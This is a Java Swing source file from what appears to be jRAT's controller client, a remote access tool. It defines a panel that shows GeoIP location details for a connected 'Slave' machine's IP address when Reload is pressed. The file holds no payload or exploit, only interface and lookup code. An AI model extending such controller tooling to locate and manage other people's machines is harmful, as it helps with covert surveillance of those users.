package se.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.Slave;
import se.jrat.client.net.GeoIP;
import se.jrat.client.ui.components.DefaultJTable;
import se.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelControlTrace extends PanelControlParent {

	private JTable table;

	public DefaultTableModel getModel() {
		return (DefaultTableModel) table.getModel();
	}

	public PanelControlTrace(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				load();
			}
		});
		btnReload.setIcon(IconUtils.getIcon("update"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 600, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 308, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 8, Short.MAX_VALUE).addComponent(btnReload).addContainerGap()));

		table = new DefaultJTable();
		table.setRowHeight(25);
		table.setModel(new DefaultTableModel(new Object[][] {}, new String[] { "Info", "Value" }));
		scrollPane.setViewportView(table);
		setLayout(groupLayout);

		loadDefault();
	}

	public void loadDefault() {
		for (int i = 0; i < GeoIP.infoArray.length; i++) {
			getModel().addRow(new Object[] { GeoIP.infoArray[i], "" });
		}
	}

	public void load() {
		try {
			String[] info = GeoIP.getInfo(slave.getRawIP());

			for (int i = 0; i < info.length; i++) {
				getModel().setValueAt(info[i], i, 1);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
